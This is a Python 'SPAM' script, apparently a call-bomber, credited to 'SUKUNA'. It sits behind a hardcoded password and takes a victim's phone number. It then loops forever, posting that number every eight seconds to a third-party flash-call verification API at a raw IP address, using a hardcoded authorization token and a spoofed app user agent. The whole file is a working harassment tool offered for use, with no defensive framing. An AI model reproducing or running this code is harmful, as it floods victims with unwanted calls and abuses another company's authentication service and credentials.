import aiohttp, asyncio, json, sys, os

# الألوان
G = '\033[1;32m'
R = '\033[1;31m'
Y = '\033[1;33m'
C = '\033[1;36m'

headers = {
    'User-Agent': "okxgvhttp/4.12.0",
    'Content-Type': "application/json; charset=UTF-8",
    'Authorization': "s6abj8F2euaFCk6"
}

def banner():
    os.system('clear')
    print(f"""{R}
  ____  _   _ _  ___   _ _   _    _     
 / ___|| | | | |/ / | | | \ | |  / \    
 \___ \| | | | ' /| | | |  \| | / _ \   
  ___) | |_| | . \| |_| | |\  |/ ___ \  
 |____/ \___/|_|\_\\___/|_| \_/_/   \_\ {Y}SPAM
    {G}Created by: Ali Talib (SUKUNA)
    ------------------------------------""")

async def __HemoCaller__(phone):
    ok, bad = 0, 0
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.post(
                    "https://31.171.171.90/api/phone-numbers/auth-flash-call",
                    data=json.dumps({"phoneNumber": phone}),
                    headers=headers,
                    timeout=10
                ) as resp:
                    text = await resp.text()
                    if '"allow":true' in text:
                        ok += 1
                    else:
                        bad += 1
            except:
                bad += 1
            sys.stdout.write(f"\r{G}[+] Sent: {ok} {R}[-] Failed: {bad} {Y} | Target: {phone}")
            sys.stdout.flush()
            await asyncio.sleep(8)

def main():
    banner()
    password = input(f"{Y}[?] Enter Password: {G}")
    if password != "1121":
        print(f"{R}[!] Wrong Password!")
        sys.exit()

    target = input(f"{Y}[+] Enter Phone (e.g +967...): {G}")
    try:
        asyncio.run(__HemoCaller__(target))
    except KeyboardInterrupt:
        print(f"\n{R}[!] Stopped.")

if __name__ == "__main__":
    main()
